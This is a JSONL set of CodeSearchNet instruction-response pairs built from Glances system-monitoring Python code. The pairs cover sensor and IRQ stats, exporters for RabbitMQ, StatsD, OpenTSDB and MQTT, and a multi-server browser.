{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef update(self):\n        # Had to convert it to string because datetime is not JSON serializable\n        self.stats = datetime.now().strftime('%Y-%m-%d %H:%M:%S')\n        # Add the time zone (issue #1249 and issue #1337)\n        if 'tmzone' in localtime():\n            self.stats += ' {}'.format(localtime().tm_zone)\n        elif len(tzname) > 0:\n            self.stats += ' {}'.format(tzname[1])\n\n        return self.stats", "response": "Update the current date and time."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning the string to display in the curse interface.", "response": "def msg_curse(self, args=None, max_width=None):\n        \"\"\"Return the string to display in the curse interface.\"\"\"\n        # Init the return message\n        ret = []\n\n        # Build the string message\n        # 23 is the padding for the process list\n        msg = '{:23}'.format(self.stats)\n        ret.append(self.curse_add_line(msg))\n\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nloads the web list from the configuration file.", "response": "def load(self, config):\n        \"\"\"Load the web list from the configuration file.\"\"\"\n        web_list = []\n\n        if config is None:\n            logger.debug(\"No configuration file available. Cannot load ports list.\")\n        elif not config.has_section(self._section):\n            logger.debug(\"No [%s] section in the configuration file. Cannot load ports list.\" % self._section)\n        else:\n            logger.debug(\"Start reading the [%s] section in the configuration file\" % self._section)\n\n            refresh = int(config.get_value(self._section, 'refresh', default=self._default_refresh))\n            timeout = int(config.get_value(self._section, 'timeout', default=self._default_timeout))\n\n            # Read the web/url list\n            for i in range(1, 256):\n                new_web = {}\n                postfix = 'web_%s_' % str(i)\n\n                # Read mandatories configuration key: host\n                new_web['url'] = config.get_value(self._section, '%s%s' % (postfix, 'url'))\n                if new_web['url'] is None:\n                    continue\n                url_parse = urlparse(new_web['url'])\n                if not bool(url_parse.scheme) or not bool(url_parse.netloc):\n                    logger.error('Bad URL (%s) in the [%s] section of configuration file.' % (new_web['url'],\n                                                                                              self._section))\n                    continue\n\n                # Read optionals configuration keys\n                # Default description is the URL without the http://\n                new_web['description'] = config.get_value(self._section,\n                                                          '%sdescription' % postfix,\n                                                          default=\"%s\" % url_parse.netloc)\n\n                # Default status\n                new_web['status'] = None\n                new_web['elapsed'] = 0\n\n                # Refresh rate in second\n                new_web['refresh'] = refresh\n\n                # Timeout in second\n                new_web['timeout'] = int(config.get_value(self._section,\n                                                          '%stimeout' % postfix,\n                                                          default=timeout))\n\n                # RTT warning\n                new_web['rtt_warning'] = config.get_value(self._section,\n                                                          '%srtt_warning' % postfix,\n                                                          default=None)\n                if new_web['rtt_warning'] is not None:\n                    # Convert to second\n                    new_web['rtt_warning'] = int(new_web['rtt_warning']) / 1000.0\n\n                # Indice\n                new_web['indice'] = 'web_' + str(i)\n                \n                # ssl_verify\n                new_web['ssl_verify'] = config.get_value(self._section, \n                                                        '%sssl_verify' % postfix,\n                                                         default=True)\n                # Proxy\n                http_proxy = config.get_value(self._section, \n                                                '%shttp_proxy' % postfix,\n                                                default=None)\n                \n                https_proxy = config.get_value(self._section, \n                                                '%shttps_proxy' % postfix,\n                                                default=None)\n\n                if https_proxy is None and http_proxy is None:\n                    new_web['proxies'] = None\n                else:\n                    new_web['proxies'] = {'http' : http_proxy,\n                                          'https' : https_proxy }\n\n                # Add the server to the list\n                logger.debug(\"Add Web URL %s to the static list\" % new_web['url'])\n                web_list.append(new_web)\n\n            # Ports list loaded\n            logger.debug(\"Web list loaded: %s\" % web_list)\n\n        return web_list"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nset the key to the value for the pos", "response": "def set_server(self, pos, key, value):\n        \"\"\"Set the key to the value for the pos (position in the list).\"\"\"\n        self._web_list[pos][key] = value"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nupdates sensors stats using the input method.", "response": "def update(self):\n        \"\"\"Update sensors stats using the input method.\"\"\"\n        # Init new stats\n        stats = self.get_init_value()\n\n        if self.input_method == 'local':\n            # Update stats using the dedicated lib\n            stats = []\n            # Get the temperature\n            try:\n                temperature = self.__set_type(self.glancesgrabsensors.get('temperature_core'),\n                                              'temperature_core')\n            except Exception as e:\n                logger.error(\"Cannot grab sensors temperatures (%s)\" % e)\n            else:\n                # Append temperature\n                stats.extend(temperature)\n            # Get the FAN speed\n            try:\n                fan_speed = self.__set_type(self.glancesgrabsensors.get('fan_speed'),\n                                            'fan_speed')\n            except Exception as e:\n                logger.error(\"Cannot grab FAN speed (%s)\" % e)\n            else:\n                # Append FAN speed\n                stats.extend(fan_speed)\n            # Update HDDtemp stats\n            try:\n                hddtemp = self.__set_type(self.hddtemp_plugin.update(),\n                                          'temperature_hdd')\n            except Exception as e:\n                logger.error(\"Cannot grab HDD temperature (%s)\" % e)\n            else:\n                # Append HDD temperature\n                stats.extend(hddtemp)\n            # Update batteries stats\n            try:\n                batpercent = self.__set_type(self.batpercent_plugin.update(),\n                                             'battery')\n            except Exception as e:\n                logger.error(\"Cannot grab battery percent (%s)\" % e)\n            else:\n                # Append Batteries %\n                stats.extend(batpercent)\n\n        elif self.input_method == 'snmp':\n            # Update stats using SNMP\n            # No standard:\n            # http://www.net-snmp.org/wiki/index.php/Net-SNMP_and_lm-sensors_on_Ubuntu_10.04\n\n            pass\n\n        # Set the alias for each stat\n        for stat in stats:\n            alias = self.has_alias(stat[\"label\"].lower())\n            if alias:\n                stat[\"label\"] = alias\n\n        # Update the stats\n        self.stats = stats\n\n        return self.stats"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef __set_type(self, stats, sensor_type):\n        for i in stats:\n            # Set the sensors type\n            i.update({'type': sensor_type})\n            # also add the key name\n            i.update({'key': self.get_key()})\n\n        return stats", "response": "Set the type of sensors in the plugin."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn the dict to display in the curse interface.", "response": "def msg_curse(self, args=None, max_width=None):\n        \"\"\"Return the dict to display in the curse interface.\"\"\"\n        # Init the return message\n        ret = []\n\n        # Only process if stats exist and display plugin enable...\n        if not self.stats or self.is_disable():\n            return ret\n\n        # Max size for the interface name\n        name_max_width = max_width - 12\n\n        # Header\n        msg = '{:{width}}'.format('SENSORS', width=name_max_width)\n        ret.append(self.curse_add_line(msg, \"TITLE\"))\n\n        # Stats\n        for i in self.stats:\n            # Do not display anything if no battery are detected\n            if i['type'] == 'battery' and i['value'] == []:\n                continue\n            # New line\n            ret.append(self.curse_new_line())\n            msg = '{:{width}}'.format(i[\"label\"][:name_max_width],\n                                      width=name_max_width)\n            ret.append(self.curse_add_line(msg))\n            if i['value'] in (b'ERR', b'SLP', b'UNK', b'NOS'):\n                msg = '{:>13}'.format(i['value'])\n                ret.append(self.curse_add_line(\n                    msg, self.get_views(item=i[self.get_key()],\n                                        key='value',\n                                        option='decoration')))\n            else:\n                if (args.fahrenheit and i['type'] != 'battery' and\n                        i['type'] != 'fan_speed'):\n                    value = to_fahrenheit(i['value'])\n                    unit = 'F'\n                else:\n                    value = i['value']\n                    unit = i['unit']\n                try:\n                    msg = '{:>13.0f}{}'.format(value, unit)\n                    ret.append(self.curse_add_line(\n                        msg, self.get_views(item=i[self.get_key()],\n                                            key='value',\n                                            option='decoration')))\n                except (TypeError, ValueError):\n                    pass\n\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nbuild the sensors list depending of the type.", "response": "def build_sensors_list(self, type):\n        \"\"\"Build the sensors list depending of the type.\n\n        type: SENSOR_TEMP_UNIT or SENSOR_FAN_UNIT\n\n        output: a list\n        \"\"\"\n        ret = []\n        if type == SENSOR_TEMP_UNIT and self.init_temp:\n            input_list = self.stemps\n            self.stemps = psutil.sensors_temperatures()\n        elif type == SENSOR_FAN_UNIT and self.init_fan:\n            input_list = self.sfans\n            self.sfans = psutil.sensors_fans()\n        else:\n            return ret\n        for chipname, chip in iteritems(input_list):\n            i = 1\n            for feature in chip:\n                sensors_current = {}\n                # Sensor name\n                if feature.label == '':\n                    sensors_current['label'] = chipname + ' ' + str(i)\n                else:\n                    sensors_current['label'] = feature.label\n                # Fan speed and unit\n                sensors_current['value'] = int(feature.current)\n                sensors_current['unit'] = type\n                # Add sensor to the list\n                ret.append(sensors_current)\n                i += 1\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nadds a user to the dictionary.", "response": "def add_user(self, username, password):\n        \"\"\"Add an user to the dictionary.\"\"\"\n        self.server.user_dict[username] = password\n        self.server.isAuth = True"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef serve_forever(self):\n        # Set the server login/password (if -P/--password tag)\n        if self.args.password != \"\":\n            self.add_user(self.args.username, self.args.password)\n        # Serve forever\n        self.server.serve_forever()", "response": "Call the main loop."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef end(self):\n        if not self.args.disable_autodiscover:\n            self.autodiscover_client.close()\n        self.server.end()", "response": "End of the Glances server session."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get(self, stat_name=None):\n        if stat_name is None:\n            return self._thresholds\n\n        if stat_name in self._thresholds:\n            return self._thresholds[stat_name]\n        else:\n            return {}", "response": "Return the threshold dict."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nadds a new threshold to the dict", "response": "def add(self, stat_name, threshold_description):\n        \"\"\"Add a new threshold to the dict (key = stat_name)\"\"\"\n        if threshold_description not in self.threshold_list:\n            return False\n        else:\n            self._thresholds[stat_name] = getattr(self.current_module,\n                                                  'GlancesThreshold' + threshold_description.capitalize())()\n            return True"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef init(self):\n        if not self.export_enable:\n            return None\n        try:\n            parameters = pika.URLParameters(\n                'amqp://' + self.user +\n                ':' + self.password +\n                '@' + self.host +\n                ':' + self.port + '/')\n            connection = pika.BlockingConnection(parameters)\n            channel = connection.channel()\n            return channel\n        except Exception as e:\n            logger.critical(\"Connection to rabbitMQ failed : %s \" % e)\n            return None", "response": "Init the connection to the rabbitmq server."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nwrite the points in RabbitMQ.", "response": "def export(self, name, columns, points):\n        \"\"\"Write the points in RabbitMQ.\"\"\"\n        data = ('hostname=' + self.hostname + ', name=' + name +\n                ', dateinfo=' + datetime.datetime.utcnow().isoformat())\n        for i in range(len(columns)):\n            if not isinstance(points[i], Number):\n                continue\n            else:\n                data += \", \" + columns[i] + \"=\" + str(points[i])\n        logger.debug(data)\n        try:\n            self.client.basic_publish(exchange='', routing_key=self.queue, body=data)\n        except Exception as e:\n            logger.error(\"Can not export stats to RabbitMQ (%s)\" % e)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nnormalizing a name for the Statsd convention", "response": "def normalize(name):\n    \"\"\"Normalize name for the Statsd convention\"\"\"\n\n    # Name should not contain some specials chars (issue #1068)\n    ret = name.replace(':', '')\n    ret = ret.replace('%', '')\n    ret = ret.replace(' ', '_')\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef init(self):\n        if not self.export_enable:\n            return None\n        logger.info(\n            \"Stats will be exported to StatsD server: {}:{}\".format(self.host,\n                                                                    self.port))\n        return StatsClient(self.host,\n                           int(self.port),\n                           prefix=self.prefix)", "response": "Initialize the connection to the Statsd server."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef export(self, name, columns, points):\n        for i in range(len(columns)):\n            if not isinstance(points[i], Number):\n                continue\n            stat_name = '{}.{}'.format(name, columns[i])\n            stat_value = points[i]\n            try:\n                self.client.gauge(normalize(stat_name),\n                                  stat_value)\n            except Exception as e:\n                logger.error(\"Can not export stats to Statsd (%s)\" % e)\n        logger.debug(\"Export {} stats to Statsd\".format(name))", "response": "Export the stats to the Statsd server."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef load(self, config):\n        ports_list = []\n\n        if config is None:\n            logger.debug(\"No configuration file available. Cannot load ports list.\")\n        elif not config.has_section(self._section):\n            logger.debug(\"No [%s] section in the configuration file. Cannot load ports list.\" % self._section)\n        else:\n            logger.debug(\"Start reading the [%s] section in the configuration file\" % self._section)\n\n            refresh = int(config.get_value(self._section, 'refresh', default=self._default_refresh))\n            timeout = int(config.get_value(self._section, 'timeout', default=self._default_timeout))\n\n            # Add default gateway on top of the ports_list lits\n            default_gateway = config.get_value(self._section, 'port_default_gateway', default='False')\n            if default_gateway.lower().startswith('true') and netifaces_tag:\n                new_port = {}\n                try:\n                    new_port['host'] = netifaces.gateways()['default'][netifaces.AF_INET][0]\n                except KeyError:\n                    new_port['host'] = None\n                # ICMP\n                new_port['port'] = 0\n                new_port['description'] = 'DefaultGateway'\n                new_port['refresh'] = refresh\n                new_port['timeout'] = timeout\n                new_port['status'] = None\n                new_port['rtt_warning'] = None\n                new_port['indice'] = str('port_0')\n                logger.debug(\"Add default gateway %s to the static list\" % (new_port['host']))\n                ports_list.append(new_port)\n\n            # Read the scan list\n            for i in range(1, 256):\n                new_port = {}\n                postfix = 'port_%s_' % str(i)\n\n                # Read mandatories configuration key: host\n                new_port['host'] = config.get_value(self._section, '%s%s' % (postfix, 'host'))\n\n                if new_port['host'] is None:\n                    continue\n\n                # Read optionals configuration keys\n                # Port is set to 0 by default. 0 mean ICMP check instead of TCP check\n                new_port['port'] = config.get_value(self._section,\n                                                    '%s%s' % (postfix, 'port'),\n                                                    0)\n                new_port['description'] = config.get_value(self._section,\n                                                           '%sdescription' % postfix,\n                                                           default=\"%s:%s\" % (new_port['host'], new_port['port']))\n\n                # Default status\n                new_port['status'] = None\n\n                # Refresh rate in second\n                new_port['refresh'] = refresh\n\n                # Timeout in second\n                new_port['timeout'] = int(config.get_value(self._section,\n                                                           '%stimeout' % postfix,\n                                                           default=timeout))\n\n                # RTT warning\n                new_port['rtt_warning'] = config.get_value(self._section,\n                                                           '%srtt_warning' % postfix,\n                                                           default=None)\n                if new_port['rtt_warning'] is not None:\n                    # Convert to second\n                    new_port['rtt_warning'] = int(new_port['rtt_warning']) / 1000.0\n\n                # Indice\n                new_port['indice'] = 'port_' + str(i)\n\n                # Add the server to the list\n                logger.debug(\"Add port %s:%s to the static list\" % (new_port['host'], new_port['port']))\n                ports_list.append(new_port)\n\n            # Ports list loaded\n            logger.debug(\"Ports list loaded: %s\" % ports_list)\n\n        return ports_list", "response": "Load the ports list from the configuration file."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nsetting the key to the value for the pos", "response": "def set_server(self, pos, key, value):\n        \"\"\"Set the key to the value for the pos (position in the list).\"\"\"\n        self._ports_list[pos][key] = value"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef init(self):\n        if not self.export_enable:\n            return None\n\n        try:\n            db = potsdb.Client(self.host,\n                               port=int(self.port),\n                               check_host=True)\n        except Exception as e:\n            logger.critical(\"Cannot connect to OpenTSDB server %s:%s (%s)\" % (self.host, self.port, e))\n            sys.exit(2)\n\n        return db", "response": "Init the connection to the OpenTSDB server."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nexport the stats to the Statsd server.", "response": "def export(self, name, columns, points):\n        \"\"\"Export the stats to the Statsd server.\"\"\"\n        for i in range(len(columns)):\n            if not isinstance(points[i], Number):\n                continue\n            stat_name = '{}.{}.{}'.format(self.prefix, name, columns[i])\n            stat_value = points[i]\n            tags = self.parse_tags(self.tags)\n            try:\n                self.client.send(stat_name, stat_value, **tags)\n            except Exception as e:\n                logger.error(\"Can not export stats %s to OpenTSDB (%s)\" % (name, e))\n        logger.debug(\"Export {} stats to OpenTSDB\".format(name))"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nbuilds and return the logger.", "response": "def glances_logger(env_key='LOG_CFG'):\n    \"\"\"Build and return the logger.\n\n    env_key define the env var where a path to a specific JSON logger\n            could be defined\n\n    :return: logger -- Logger instance\n    \"\"\"\n    _logger = logging.getLogger()\n\n    # By default, use the LOGGING_CFG logger configuration\n    config = LOGGING_CFG\n\n    # Check if a specific configuration is available\n    user_file = os.getenv(env_key, None)\n    if user_file and os.path.exists(user_file):\n        # A user file as been defined. Use it...\n        with open(user_file, 'rt') as f:\n            config = json.load(f)\n\n    # Load the configuration\n    logging.config.dictConfig(config)\n\n    return _logger"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef update(self):\n        # Init new stats\n        stats = self.get_init_value()\n\n        # IRQ plugin only available on GNU/Linux\n        if not LINUX:\n            return self.stats\n\n        if self.input_method == 'local':\n            # Grab the stats\n            stats = self.irq.get()\n\n        elif self.input_method == 'snmp':\n            # not available\n            pass\n\n        # Get the TOP 5 (by rate/s)\n        stats = sorted(stats,\n                       key=operator.itemgetter('irq_rate'),\n                       reverse=True)[:5]\n\n        # Update the stats\n        self.stats = stats\n\n        return self.stats", "response": "Update the IRQ stats."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn the dict to display in the curse interface.", "response": "def msg_curse(self, args=None, max_width=None):\n        \"\"\"Return the dict to display in the curse interface.\"\"\"\n        # Init the return message\n        ret = []\n\n        # Only available on GNU/Linux\n        # Only process if stats exist and display plugin enable...\n        if not LINUX or not self.stats or not self.args.enable_irq:\n            return ret\n\n        # Max size for the interface name\n        name_max_width = max_width - 7\n\n        # Build the string message\n        # Header\n        msg = '{:{width}}'.format('IRQ', width=name_max_width)\n        ret.append(self.curse_add_line(msg, \"TITLE\"))\n        msg = '{:>9}'.format('Rate/s')\n        ret.append(self.curse_add_line(msg))\n\n        for i in self.stats:\n            ret.append(self.curse_new_line())\n            msg = '{:{width}}'.format(i['irq_line'][:name_max_width],\n                                      width=name_max_width)\n            ret.append(self.curse_add_line(msg))\n            msg = '{:>9}'.format(str(i['irq_rate']))\n            ret.append(self.curse_add_line(msg))\n\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nbuilding the header (contain the number of CPU). CPU0 CPU1 CPU2 CPU3 0: 21 0 0 0 IO-APIC 2-edge timer", "response": "def __header(self, line):\n        \"\"\"Build the header (contain the number of CPU).\n\n        CPU0       CPU1       CPU2       CPU3\n        0:         21          0          0          0   IO-APIC   2-edge      timer\n        \"\"\"\n        self.cpu_number = len(line.split())\n        return self.cpu_number"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef __humanname(self, line):\n        splitted_line = line.split()\n        irq_line = splitted_line[0].replace(':', '')\n        if irq_line.isdigit():\n            # If the first column is a digit, use the alias (last column)\n            irq_line += '_{}'.format(splitted_line[-1])\n        return irq_line", "response": "Return the human - readable name of the IRQ line."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef __sum(self, line):\n        splitted_line = line.split()\n        try:\n            ret = sum(map(int, splitted_line[1:(self.cpu_number + 1)]))\n        except ValueError:\n            # Correct issue #1007 on some conf (Raspberry Pi with Raspbian)\n            ret = 0\n        return ret", "response": "Return the IRQ sum number."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nloads the IRQ file and update the internal dict.", "response": "def __update(self):\n        \"\"\"Load the IRQ file and update the internal dict.\"\"\"\n        self.reset()\n\n        if not os.path.exists(self.IRQ_FILE):\n            # Correct issue #947: IRQ file do not exist on OpenVZ container\n            return self.stats\n\n        try:\n            with open(self.IRQ_FILE) as irq_proc:\n                time_since_update = getTimeSinceLastUpdate('irq')\n                # Read the header\n                self.__header(irq_proc.readline())\n                # Read the rest of the lines (one line per IRQ)\n                for line in irq_proc.readlines():\n                    irq_line = self.__humanname(line)\n                    current_irqs = self.__sum(line)\n                    irq_rate = int(\n                        current_irqs - self.lasts.get(irq_line)\n                        if self.lasts.get(irq_line)\n                        else 0 // time_since_update)\n                    irq_current = {\n                        'irq_line': irq_line,\n                        'irq_rate': irq_rate,\n                        'key': self.get_key(),\n                        'time_since_update': time_since_update\n                    }\n                    self.stats.append(irq_current)\n                    self.lasts[irq_line] = current_irqs\n        except (OSError, IOError):\n            pass\n\n        return self.stats"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nwriting the points in MQTT.", "response": "def export(self, name, columns, points):\n        \"\"\"Write the points in MQTT.\"\"\"\n\n        WHITELIST = '_-' + string.ascii_letters + string.digits\n        SUBSTITUTE = '_'\n\n        def whitelisted(s,\n                        whitelist=WHITELIST,\n                        substitute=SUBSTITUTE):\n            return ''.join(c if c in whitelist else substitute for c in s)\n\n        for sensor, value in zip(columns, points):\n            try:\n                sensor = [whitelisted(name) for name in sensor.split('.')]\n                tobeexport = [self.topic, self.hostname, name]\n                tobeexport.extend(sensor)\n                topic = '/'.join(tobeexport)\n\n                self.client.publish(topic, value)\n            except Exception as e:\n                logger.error(\"Can not export stats to MQTT server (%s)\" % e)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef update(self):\n        # Init new stats\n        stats = self.get_init_value()\n\n        if self.input_method == 'local':\n            # Update stats\n            self.glancesgrabbat.update()\n            stats = self.glancesgrabbat.get()\n\n        elif self.input_method == 'snmp':\n            # Update stats using SNMP\n            # Not avalaible\n            pass\n\n        # Update the stats\n        self.stats = stats\n\n        return self.stats", "response": "Update battery capacity stats using the input method."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef battery_percent(self):\n        if not batinfo_tag or not self.bat.stat:\n            return []\n\n        # Init the bsum (sum of percent)\n        # and Loop over batteries (yes a computer could have more than 1 battery)\n        bsum = 0\n        for b in self.bat.stat:\n            try:\n                bsum += int(b.capacity)\n            except ValueError:\n                return []\n\n        # Return the global percent\n        return int(bsum / len(self.bat.stat))", "response": "Get batteries capacity percent."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef load(self):\n        # Init the static server list (if defined)\n        self.static_server = GlancesStaticServer(config=self.config)\n\n        # Init the password list (if defined)\n        self.password = GlancesPassword(config=self.config)", "response": "Load server and password list from the confiuration file."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn the current server list ( list of dict.", "response": "def get_servers_list(self):\n        \"\"\"Return the current server list (list of dict).\n\n        Merge of static + autodiscover servers list.\n        \"\"\"\n        ret = []\n\n        if self.args.browser:\n            ret = self.static_server.get_servers_list()\n            if self.autodiscover_server is not None:\n                ret = self.static_server.get_servers_list() + self.autodiscover_server.get_servers_list()\n\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef __get_uri(self, server):\n        # Select the connection mode (with or without password)\n        if server['password'] != \"\":\n            if server['status'] == 'PROTECTED':\n                # Try with the preconfigure password (only if status is PROTECTED)\n                clear_password = self.password.get_password(server['name'])\n                if clear_password is not None:\n                    server['password'] = self.password.sha256_hash(clear_password)\n            return 'http://{}:{}@{}:{}'.format(server['username'], server['password'],\n                                               server['ip'], server['port'])\n        else:\n            return 'http://{}:{}'.format(server['ip'], server['port'])", "response": "Return the URI for the given server dict."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef __update_stats(self, server):\n        # Get the server URI\n        uri = self.__get_uri(server)\n\n        # Try to connect to the server\n        t = GlancesClientTransport()\n        t.set_timeout(3)\n\n        # Get common stats\n        try:\n            s = ServerProxy(uri, transport=t)\n        except Exception as e:\n            logger.warning(\n                \"Client browser couldn't create socket {}: {}\".format(uri, e))\n        else:\n            # Mandatory stats\n            try:\n                # CPU%\n                cpu_percent = 100 - json.loads(s.getCpu())['idle']\n                server['cpu_percent'] = '{:.1f}'.format(cpu_percent)\n                # MEM%\n                server['mem_percent'] = json.loads(s.getMem())['percent']\n                # OS (Human Readable name)\n                server['hr_name'] = json.loads(s.getSystem())['hr_name']\n            except (socket.error, Fault, KeyError) as e:\n                logger.debug(\n                    \"Error while grabbing stats form {}: {}\".format(uri, e))\n                server['status'] = 'OFFLINE'\n            except ProtocolError as e:\n                if e.errcode == 401:\n                    # Error 401 (Authentication failed)\n                    # Password is not the good one...\n                    server['password'] = None\n                    server['status'] = 'PROTECTED'\n                else:\n                    server['status'] = 'OFFLINE'\n                logger.debug(\"Cannot grab stats from {} ({} {})\".format(uri, e.errcode, e.errmsg))\n            else:\n                # Status\n                server['status'] = 'ONLINE'\n\n                # Optional stats (load is not available on Windows OS)\n                try:\n                    # LOAD\n                    load_min5 = json.loads(s.getLoad())['min5']\n                    server['load_min5'] = '{:.2f}'.format(load_min5)\n                except Exception as e:\n                    logger.warning(\n                        \"Error while grabbing stats form {}: {}\".format(uri, e))\n\n        return server", "response": "Update stats for the given server"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef __display_server(self, server):\n        # Display the Glances client for the selected server\n        logger.debug(\"Selected server {}\".format(server))\n\n        # Connection can take time\n        # Display a popup\n        self.screen.display_popup(\n            'Connect to {}:{}'.format(server['name'], server['port']), duration=1)\n\n        # A password is needed to access to the server's stats\n        if server['password'] is None:\n            # First of all, check if a password is available in the [passwords] section\n            clear_password = self.password.get_password(server['name'])\n            if (clear_password is None or self.get_servers_list()\n                    [self.screen.active_server]['status'] == 'PROTECTED'):\n                # Else, the password should be enter by the user\n                # Display a popup to enter password\n                clear_password = self.screen.display_popup(\n                    'Password needed for {}: '.format(server['name']), is_input=True)\n            # Store the password for the selected server\n            if clear_password is not None:\n                self.set_in_selected('password', self.password.sha256_hash(clear_password))\n\n        # Display the Glance client on the selected server\n        logger.info(\"Connect Glances client to the {} server\".format(server['key']))\n\n        # Init the client\n        args_server = self.args\n\n        # Overwrite connection setting\n        args_server.client = server['ip']\n        args_server.port = server['port']\n        args_server.username = server['username']\n        args_server.password = server['password']\n        client = GlancesClient(config=self.config, args=args_server, return_to_browser=True)\n\n        # Test if client and server are in the same major version\n        if not client.login():\n            self.screen.display_popup(\n                \"Sorry, cannot connect to '{}'\\n\"\n                \"See '{}' for more details\".format(server['name'], LOG_FILENAME))\n\n            # Set the ONLINE status for the selected server\n            self.set_in_selected('status', 'OFFLINE')\n        else:\n            # Start the client loop\n            # Return connection type: 'glances' or 'snmp'\n            connection_type = client.serve_forever()\n\n            try:\n                logger.debug(\"Disconnect Glances client from the {} server\".format(server['key']))\n            except IndexError:\n                # Server did not exist anymore\n                pass\n            else:\n                # Set the ONLINE status for the selected server\n                if connection_type == 'snmp':\n                    self.set_in_selected('status', 'SNMP')\n                else:\n                    self.set_in_selected('status', 'ONLINE')\n\n        # Return to the browser (no server selected)\n        self.screen.active_server = None", "response": "Connect and display the given server and display the Glances client"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef __serve_forever(self):\n        # No need to update the server list\n        # It's done by the GlancesAutoDiscoverListener class (autodiscover.py)\n        # Or define staticaly in the configuration file (module static_list.py)\n        # For each server in the list, grab elementary stats (CPU, LOAD, MEM, OS...)\n        thread_list = {}\n        while self.screen.is_end == False:\n            logger.debug(\"Iter through the following server list: {}\".format(self.get_servers_list()))\n            for v in self.get_servers_list():\n                key = v[\"key\"]\n                thread = thread_list.get(key, None)\n                if thread is None or thread.is_alive() == False:\n                    thread = threading.Thread(target=self.__update_stats, args=[v])\n                    thread_list[key] = thread\n                    thread.start()\n\n            # Update the screen (list or Glances client)\n            if self.screen.active_server is None:\n                #  Display the Glances browser\n                self.screen.update(self.get_servers_list())\n            else:\n                # Display the active server\n                self.__display_server(self.get_servers_list()[self.screen.active_server])\n\n        # exit key pressed\n        for thread in thread_list.values():\n            thread.join()", "response": "Main loop for Glances server list update the screen list and display the active server"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef set_in_selected(self, key, value):\n        # Static list then dynamic one\n        if self.screen.active_server >= len(self.static_server.get_servers_list()):\n            self.autodiscover_server.set_server(\n                self.screen.active_server - len(self.static_server.get_servers_list()),\n                key, value)\n        else:\n            self.static_server.set_server(self.screen.active_server, key, value)", "response": "Set the ( key value ) for the selected server in the list."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ngenerating Graph file in the output folder.", "response": "def update(self, stats):\n        \"\"\"Generate Graph file in the output folder.\"\"\"\n\n        if self.generate_every != 0 and self._timer.finished():\n            self.args.generate_graph = True\n            self._timer.reset()\n\n        if not self.args.generate_graph:\n            return\n\n        plugins = stats.getPluginsList()\n        for plugin_name in plugins:\n            plugin = stats._plugins[plugin_name]\n            if plugin_name in self.plugins_to_export():\n                self.export(plugin_name, plugin.get_export_history())\n\n        logger.info(\"Graphs created in the folder {}\".format(self.path))\n        self.args.generate_graph = False"}
